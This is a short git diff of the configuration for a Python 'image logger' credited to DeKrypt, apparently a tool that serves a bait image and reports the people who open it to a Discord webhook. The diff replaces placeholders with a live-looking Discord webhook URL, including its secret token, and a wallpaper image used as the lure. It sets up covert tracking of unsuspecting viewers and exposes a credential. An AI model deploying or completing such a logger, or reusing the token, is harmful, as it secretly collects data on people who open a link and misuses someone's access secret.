@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1349833696730943619/LLLi_SoFRzG7DmhAvxW6KMXe9mZZo3f0mjczSGq99BIC46Xa6C0HACYOtu6aPQHWtM82",
+    "image": "https://1.bp.blogspot.com/-WpAKD1ApiPc/XwQhC8GmqeI/AAAAAAAACwE/Wa8i8HJh8ak1zOJA2s47Y9Opqt2xWnUKACLcBGAsYHQ/s1600/%25D8%25A3%25D9%2581%25D8%25B6%25D9%2584%2B%25D8%25AE%25D9%2584%25D9%2581%25D9%258A%25D8%25A7%25D8%25AA%2B%25D9%2583%25D9%2585%25D8%25A8%25D9%258A%25D9%2588%25D8%25AA%25D8%25B1%2B%25D8%25B9%25D8%25A7%25D9%2584%25D9%258A%25D8%25A9%2B%25D8%25A7%25D9%2584%25D8%25AF%25D9%2582%25D8%25A9%2B-%2B4k%2Bwallpapers%2Bfor%2Bwindows%2B%25286%2529.webp", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
